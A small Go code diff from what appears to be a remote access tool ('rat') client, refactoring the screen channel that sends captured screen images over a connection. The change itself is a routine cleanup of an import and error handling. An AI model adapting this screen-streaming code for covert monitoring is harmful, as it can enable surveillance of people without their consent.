@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"encoding/binary"
-	"fmt"
 	"image"
 	"io"
 	"rat/client/screen"
@@ -87,11 +86,8 @@ func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 				ll.Flush()
 				ll.Close()
 
-
 				binary.Write(channel, binary.LittleEndian, int32(imgdata.Len()))
-				_, err = channel.Write(imgdata.Bytes())
-
-				if err != nil {
+				if _, err = channel.Write(imgdata.Bytes()); err != nil {
 					return
 				}
 			}
